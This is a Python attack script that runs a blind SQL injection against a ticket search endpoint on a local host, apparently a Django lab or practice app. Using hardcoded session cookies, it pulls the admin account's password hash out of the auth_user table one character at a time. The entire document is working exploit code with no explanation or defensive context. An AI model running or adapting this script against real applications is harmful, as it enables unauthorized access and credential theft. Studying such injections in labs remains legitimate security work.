import requests
import string

BASE_URL = "http://127.0.0.1:5001/tickets/search/"
COOKIES = {
    "csrftoken": "OVgBJo6oWFz3J3h2ZG3nk3oHZGQc4UYW",
    "sessionid": "k5ubmxvtg3zuwkt2ewnfdojztslky9kl",
}

# pbkdf2_sha256 hashes use letters, digits, and these symbols: $ + / =
CHARSET = string.ascii_letters + string.digits + "$+/=_"

def is_true(position, char):
    safe_char = char.replace("'", "''")
    payload = (
        f"' AND (SELECT SUBSTRING(password,{position},1) "
        f"FROM auth_user WHERE username='admin') = '{safe_char}' --"
    )
    params = {"q": payload}
    resp = requests.get(BASE_URL, params=params, cookies=COOKIES)
    return "0 matches." not in resp.text

def extract_hash(max_length=100):
    result = ""
    for position in range(1, max_length + 1):
        found = False
        for char in CHARSET:
            if is_true(position, char):
                result += char
                print(f"Position {position}: '{char}'  -> {result}")
                found = True
                break
        if not found:
            print("No character matched at this position — end of string reached.")
            break
    return result

if __name__ == "__main__":
    print("Extracting admin password hash character by character...\n")
    final = extract_hash()
    print(f"\nDone. Recovered hash:\n{final}")